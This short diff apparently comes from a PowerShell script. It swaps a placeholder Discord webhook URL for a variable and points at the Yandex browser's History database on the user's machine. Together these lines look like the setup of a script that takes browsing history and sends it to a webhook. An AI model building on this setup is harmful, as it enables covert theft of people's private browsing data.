@@ -1,5 +1,5 @@
 # Your Discord webhook URL
-$discordWebhookUrl = "<DISCORD_WEBHOOK_URL>"
+$discordWebhookUrl = "$dc"
 
 $chromeHistoryPath = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\History"
 
